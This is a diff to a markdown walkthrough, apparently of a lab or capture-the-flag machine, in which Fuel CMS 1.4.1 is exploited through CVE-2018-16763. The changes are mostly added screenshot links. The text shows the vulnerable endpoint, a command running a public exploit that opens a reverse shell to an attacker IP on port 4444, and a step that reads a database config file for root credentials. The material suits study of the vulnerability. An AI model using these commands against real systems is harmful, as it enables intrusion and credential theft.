@@ -36,8 +36,6 @@ Further inspection revealed the presence of a **user guide**, which disclosed th
 
 A search for known vulnerabilities affecting this version led to the discovery of a **Remote Code Execution (RCE)** vulnerability (**CVE-2018-16763**). This flaw allows attackers to execute arbitrary system commands via the `filter` parameter in the following endpoint:
 
-![CVE-2018-16763](images/cve.png)
-
 ```text
 /fuel/pages/select/?filter=
 ```
@@ -47,6 +45,8 @@ Additional research across security advisories and exploit databases confirmed t
 A working exploit was then identified in a public GitHub repository:
 
 👉 [Fuel CMS 1.4.1 RCE Exploit](https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated/blob/main/Fuel-Updated.py)
+
+![GitHub exploit](images/github-exploit.png)
 
 This exploit is written in **Python** and leverages the vulnerable endpoint to achieve **remote command execution** on the target system.
 
@@ -70,8 +70,11 @@ The exploit was then executed with the appropriate parameters:
 ```bash
 python3 Fuel-Updated.py http://10.130.137.229 10.129.79.84 4444
 ```
+![Exploit Executed](images/exploit-exec.png)
 
 Once executed, the target system initiated a connection back to the attacker, resulting in a **reverse shell** under the `www-data` user.
+
+![Reverse Shell](images/rev-shell.png)
 
 Basic enumeration commands were used to verify access:
 
@@ -99,8 +102,11 @@ During this process, a configuration file was identified:
 ```bash
 cat /var/www/html/fuel/application/config/database.php
 ```
+![Database](images/database.png)
 
 This file contained database credentials, including a password associated with the `root` user.
+
+![Database Credentials](images/credentials-db.png)
 
 ---
 
